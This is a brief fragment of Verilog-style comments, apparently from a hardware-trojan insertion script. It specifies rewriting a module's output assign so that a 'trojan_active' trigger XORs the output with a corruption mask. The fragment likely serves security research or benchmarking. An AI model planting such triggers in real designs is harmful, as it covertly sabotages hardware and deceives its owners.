...
//
// IMPORTANT: out may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If out is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for out (or first output assign):
//     assign out = <expr>;
//   Replace with:
//     assign out = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
